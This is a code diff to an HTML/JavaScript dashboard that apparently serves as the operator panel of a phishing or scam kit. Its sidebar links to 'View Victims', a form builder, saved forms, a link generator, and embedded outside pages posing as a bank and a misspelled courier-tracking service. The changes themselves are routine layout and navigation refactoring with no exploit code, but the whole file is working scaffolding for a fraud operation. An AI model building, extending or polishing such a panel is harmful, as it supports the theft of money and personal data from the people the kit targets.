@@ -17,8 +17,8 @@
     position: fixed;
     top: 0; left: 0;
     width: 100vw; height: 100vh;
-    z-index: -1;           /* 👈 behind everything */
-    pointer-events: none;  /* 👈 don’t block clicks */
+    z-index: 0;
+    pointer-events: none;
     background: black;
   }
   .header {
@@ -42,7 +42,7 @@
     height: calc(100% - 70px);
     background: rgba(0,0,0,0.9);
     padding: 15px 10px;
-    display: none; /* hidden until menu is opened */
+    display: none;
     flex-direction: column;
     gap: 10px;
     z-index: 20;
@@ -67,9 +67,13 @@
   .content {
     margin-top: 70px;
     height: calc(100% - 70px);
+    padding: 10px;
+    overflow: auto;
     position: relative;
     z-index: 5;
+    background: rgba(0,0,0,0.7);
   }
+
   iframe {
     width: 100%;
     height: 100%;
@@ -105,127 +109,58 @@
 
 <!-- Sidebar -->
 <div class="sidebar" id="sidebarMenu">
-  <a onclick="openPage('form-builder')">🎨 Form Builder</a>
-  <a onclick="openPage('forms')">💾 Saved Forms</a>
-  <a onclick="openPage('feedback')">📝 Feedback</a>
-  <a onclick="openPage('victims')">🧠 View Victims</a>
-  <a onclick="openPage('members')">👥 Members</a>
-  <a onclick="openPage('links')">🔗 Links</a>
-  <a onclick="openPage('generate')">🧾 Generate</a>
-  <a onclick="openPage('bank')">🏦 Bank</a>
-  <a onclick="openPage('tracking')">📦 Tracking (Carrier Federal)</a>
+  <a href="form-builder.html">🎨 Form Builder</a>
+  <a href="forms.html">💾 Saved Forms</a>
+  <a href="feedback.html">📝 Feedback</a>
+  <a href="victims.html">🧠 View Victims</a>
+  <a href="members.html">👥 Members</a>
+  <a href="links.html">🔗 Links</a>
+  <a href="generate.html">🧾 Generate</a>
+  <a onclick="openIframe('bank')">🏦 Bank</a>
+  <a onclick="openIframe('tracking')">📦 Tracking (Carrier Federal)</a>
 </div>
 
 <!-- Main content -->
-<div class="content">
-  <iframe id="iframePage" src="Social-media-links/build.html"></iframe>
+<div class="content" id="mainContent">
+  <h2>Welcome to the Dashboard</h2>
+  <p>Select a menu option to load content.</p>
 </div>
 
 <script>
   const sidebar = document.getElementById("sidebarMenu");
   const menuBtn = document.getElementById("menuBtn");
-  const iframe = document.getElementById("iframePage");
+  const contentDiv = document.getElementById("mainContent");
 
-  // Toggle sidebar when Menu is clicked
+  // Toggle sidebar
   menuBtn.addEventListener("click", () => {
     sidebar.style.display = sidebar.style.display === "flex" ? "none" : "flex";
   });
 
-  // Helper to show a friendly 404 message inside the iframe
-  function showNotFoundInIframe(url) {
-    const html = `<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>404 — Not Found</title>
-</head>
-<body style="background:#0b0b0b;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
-  <div style="text-align:center;max-width:720px;padding:20px;">
-    <h1 style="margin:0 0 12px;font-size:28px;">404 — Page not found</h1>
-    <p style="margin:0 0 8px;">Could not load <strong>${url}</strong>.</p>
-    <p style="margin:0 0 16px;">Make sure the file exists at that path (case-sensitive on many servers).</p>
-    <p style="margin:0;font-size:13px;opacity:0.8;">If the file exists, check the filename and path. Example expected path: <code>Social-media-links/build.html</code></p>
-  </div>
-</body>
-</html>`;
-    // Use srcdoc so we don't navigate away from the dashboard origin
-    iframe.srcdoc = html;
+  // Load external sites in iframe
+  function openIframe(page) {
     sidebar.style.display = "none";
-    console.warn('Page not found:', url);
-  }
-
-  // Load iframe page but first verify internal pages exist to avoid 404
-  function openPage(page) {
-    const base = "Social-media-links/";
-    const pages = {
-      'form-builder': base + "build.html",
-      'forms': base + "forms.html",
-      'feedback': base + "feedback.html",
-      'victims': base + "victims.html",
-      'members': base + "members.html",
-      'links': base + "links.html",
-      'generate': base + "generate.html",
+    const iframePages = {
       'bank': "https://bulksms4.github.io/BANKING/",
       'tracking': "https://x-cargo-exprees.web.app/"
     };
-
-    const url = pages[page];
-    if (!url) return;
-
-    // external links (http/https) -> load directly
-    if (/^https?:\/\//i.test(url)) {
-      iframe.src = url;
-      sidebar.style.display = "none";
-      return;
+    if (iframePages[page]) {
+      contentDiv.innerHTML = `<iframe src="${iframePages[page]}"></iframe>`;
     }
-
-    // For same-origin/local files, check that the file exists before loading
-    // Try a HEAD request first, fallback to GET if HEAD fails
-    fetch(url, { method: 'HEAD', cache: 'no-store' })
-      .then(resp => {
-        if (resp.ok) {
-          iframe.src = url;
-          sidebar.style.display = "none";
-        } else {
-          // not ok (404, 500, etc)
-          showNotFoundInIframe(url);
-        }
-      })
-      .catch(() => {
-        // Some servers block HEAD — try GET
-        fetch(url, { method: 'GET', cache: 'no-store' })
-          .then(resp2 => {
-            if (resp2.ok) {
-              iframe.src = url;
-            } else {
-              showNotFoundInIframe(url);
-            }
-            sidebar.style.display = "none";
-          })
-          .catch(() => {
-            // Could not fetch — show friendly message
-            showNotFoundInIframe(url);
-          });
-      });
   }
 
-  /* Background Matrix Effect */
+  /* Matrix Background */
   const canvas = document.getElementById('backgroundCanvas');
   const ctx = canvas.getContext('2d');
   let width, height;
   function resizeCanvas() {
     width = canvas.width = window.innerWidth;
     height = canvas.height = window.innerHeight;
-    // update columns/drops when resized
-    columns = Math.floor(width / fontSize);
-    drops.length = columns;
-    for (let i = 0; i < columns; i++) if (!drops[i]) drops[i] = 1;
   }
   window.addEventListener('resize', resizeCanvas);
   resizeCanvas();
   const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
   const fontSize = 16;
-  let columns = Math.floor(window.innerWidth / fontSize);
+  let columns = Math.floor(width / fontSize);
   const drops = new Array(columns).fill(1);
   function draw() {
     ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
